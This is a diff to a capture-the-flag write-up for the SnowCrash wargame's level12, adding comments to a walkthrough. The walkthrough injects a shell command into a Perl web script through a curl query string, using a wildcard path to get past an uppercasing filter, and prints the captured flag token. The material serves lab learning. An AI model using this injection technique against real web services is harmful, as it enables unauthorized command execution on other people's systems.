@@ -13,9 +13,14 @@ so we will try to exploit a vulnerability of level12, to make it execute getflag
 this perl code performs the following operations on parameter1: 
 shift to uppercase, remove everything after a space
 
+=> we create a file with the script we want to execute, with +x rights
 level12@SnowCrash:~$ echo 'echo "$(getflag)" > /tmp/res12' > /tmp/PLOP
 level12@SnowCrash:~$ chmod +x /tmp/PLOP
+
+=> we send out file as an argument, with wildcards to avoid lower case propblems
 level12@SnowCrash:~$ curl 'localhost:4646/?x=$(/*/PLOP)'
+
+=> token has been written in the tmp file
 ..level12@SnowCrash:~$ cat /tmp/res12
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 
